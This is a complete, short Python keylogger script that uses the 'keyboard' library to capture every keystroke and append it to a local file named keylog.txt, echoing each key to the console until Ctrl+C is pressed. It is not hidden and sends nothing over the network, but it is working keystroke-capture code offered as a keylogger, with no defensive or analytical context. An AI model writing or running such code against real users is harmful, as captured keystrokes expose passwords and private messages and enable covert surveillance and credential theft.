import keyboard
import time

def keylogger():
    log_file = "keylog.txt"
    print("Keylogger started. Press Ctrl+C to stop.")
    try:
        with open(log_file, "a") as f:
            while True:
                key = keyboard.read_key()
                if key == "ctrl+c":
                    break
                f.write(key + "\n")
                print(key)
                time.sleep(0.01)
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")

if __name__ == "__main__":
    keylogger()